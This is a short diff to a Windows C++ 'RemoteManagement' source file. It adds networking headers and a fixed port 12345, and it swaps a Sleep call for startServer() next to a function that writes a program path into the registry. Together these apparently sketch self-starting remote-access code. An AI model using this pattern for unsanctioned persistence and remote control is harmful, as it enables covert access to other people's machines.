@@ -1,12 +1,18 @@
 #include "RemoteManagement.h"
 
 #include <iostream>
-
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
 #include "windows.h"
+
+#include "server.h"
 
 using std::cout;
 using std::endl;
 using std::string;
+
+PCSTR PORT = "12345";
 
 LSTATUS addPathToRegistry(HKEY keyHandle, const string programPath) {
     DWORD pathSize = static_cast<DWORD>(programPath.size()) + 1;
@@ -22,5 +28,5 @@ LSTATUS addPathToRegistry(HKEY keyHandle, const string programPath) {
 
 void runRemoteManagementProgram() {
     MessageBoxA(NULL, MESSAGE_BOX_TEXT, MESSAGE_BOX_TITLE, MESSAGE_BOX_TYPE);
-    Sleep(SLEEP_TIME);
+    startServer();
 }
